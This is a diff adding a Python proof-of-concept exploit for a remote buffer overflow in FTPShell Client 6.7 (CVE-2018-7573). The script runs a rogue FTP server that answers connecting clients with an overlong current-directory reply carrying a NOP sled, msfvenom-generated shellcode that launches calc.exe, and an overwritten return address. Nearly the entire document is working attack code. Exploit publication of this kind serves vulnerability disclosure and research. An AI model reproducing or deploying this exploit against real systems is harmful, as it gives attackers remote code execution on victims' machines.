@@ -1,0 +1,58 @@
+# -*- coding: utf-8 -*-
+
+# Exploit Title: FTPShell Client 6.7 - Remote Buffer Overflow
+# Date: 2018-01-03
+# Exploit Author: Sebastián Castro @r4wd3r
+# Vendor Homepage: http://www.ftpshell.com/index.htm
+# Software Link: http://www.ftpshell.com/download.htm
+# Version: 6.7
+# Tested on: Windows Server 2008 R2 x64, Windows 7 SP1 x64, Windows XP SP3 x86.
+# CVE : CVE-2018-7573
+
+import socket
+import sys
+
+port = 21
+
+# msfvenom -p windows/exec CMD=calc.exe -f python -b '\x00\x22\x0d\x0a'
+buf =  ""
+buf += "\xdb\xc8\xba\x3e\x93\x15\x8f\xd9\x74\x24\xf4\x5e\x33"
+buf += "\xc9\xb1\x31\x31\x56\x18\x03\x56\x18\x83\xc6\x3a\x71"
+buf += "\xe0\x73\xaa\xf7\x0b\x8c\x2a\x98\x82\x69\x1b\x98\xf1"
+buf += "\xfa\x0b\x28\x71\xae\xa7\xc3\xd7\x5b\x3c\xa1\xff\x6c"
+buf += "\xf5\x0c\x26\x42\x06\x3c\x1a\xc5\x84\x3f\x4f\x25\xb5"
+buf += "\x8f\x82\x24\xf2\xf2\x6f\x74\xab\x79\xdd\x69\xd8\x34"
+buf += "\xde\x02\x92\xd9\x66\xf6\x62\xdb\x47\xa9\xf9\x82\x47"
+buf += "\x4b\x2e\xbf\xc1\x53\x33\xfa\x98\xe8\x87\x70\x1b\x39"
+buf += "\xd6\x79\xb0\x04\xd7\x8b\xc8\x41\xdf\x73\xbf\xbb\x1c"
+buf += "\x09\xb8\x7f\x5f\xd5\x4d\x64\xc7\x9e\xf6\x40\xf6\x73"
+buf += "\x60\x02\xf4\x38\xe6\x4c\x18\xbe\x2b\xe7\x24\x4b\xca"
+buf += "\x28\xad\x0f\xe9\xec\xf6\xd4\x90\xb5\x52\xba\xad\xa6"
+buf += "\x3d\x63\x08\xac\xd3\x70\x21\xef\xb9\x87\xb7\x95\x8f"
+buf += "\x88\xc7\x95\xbf\xe0\xf6\x1e\x50\x76\x07\xf5\x15\x88"
+buf += "\x4d\x54\x3f\x01\x08\x0c\x02\x4c\xab\xfa\x40\x69\x28"
+buf += "\x0f\x38\x8e\x30\x7a\x3d\xca\xf6\x96\x4f\x43\x93\x98"
+buf += "\xfc\x64\xb6\xfa\x63\xf7\x5a\xd3\x06\x7f\xf8\x2b"
+
+try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.bind(("0.0.0.0", port))
+        s.listen(5)
+        print("[+] FTP server started on port: "+str(port)+"\r\n")
+except:
+        print("[x] Failed to start the server on port: "+str(port)+"\r\n")
+
+eip = "\xed\x2e\x45" # CALL ESI from FTPShell.exe : 0x00452eed
+nops = "\x90"*40
+junk = "F"*(400 - len(nops) - len(buf))
+payload = nops + buf + junk + eip
+
+while True:
+    conn, addr = s.accept()
+    conn.send('220 FTP Server\r\n')
+    print(conn.recv(1024))
+    conn.send("331 OK\r\n")
+    print(conn.recv(1024))
+    conn.send('230 OK\r\n')
+    print(conn.recv(1024))
+    conn.send('220 "'+payload+'" is current directory\r\n')
